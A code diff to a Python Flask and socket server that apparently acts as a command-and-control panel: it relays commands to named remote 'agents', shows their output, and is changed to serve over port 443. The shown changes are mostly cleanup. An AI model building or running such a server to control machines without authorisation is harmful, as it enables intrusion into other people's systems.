@@ -1,17 +1,12 @@
-from audioop import add
 import socket
-from sqlite3 import connect
 import threading
 import time
 from flask import *
-import shutil 
-from pathlib import Path
+
 ip_address ='127.0.0.1'
 port_number = 5555
 packet_size = 2048
-COMPUTERS=[]
-CONNECTIONS=[]
-IPS = []
+
 CMD_INPUT = []
 CMD_OUTPUT = []
 
@@ -34,7 +29,6 @@ def server():
     server_socket.bind((ip_address,port_number))
     print("Starting Server....")
     server_socket.listen(5)
-    x=0
     INDEX =0
     while(True):
         connection,address = server_socket.accept()
@@ -152,8 +146,9 @@ def execute(agentname,cmdoutput='',cmd_input=""):
             cmdoutput = CMD_OUTPUT[req_index]
             print(cmdoutput)
             return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=agentname,cmd_input=cmd)
+
     if request.method == 'GET':
         return render_template("executecmd.html",name=agentname,cmdoutput=cmdoutput,cmd_input=cmd_input)
 
 if __name__=='__main__':
-    app.run(debug=True,threaded=True,ssl_context=('cert.pem', 'key.pem'))
+    app.run(debug=True,threaded=True,ssl_context=('cert.pem', 'key.pem'),port=443)
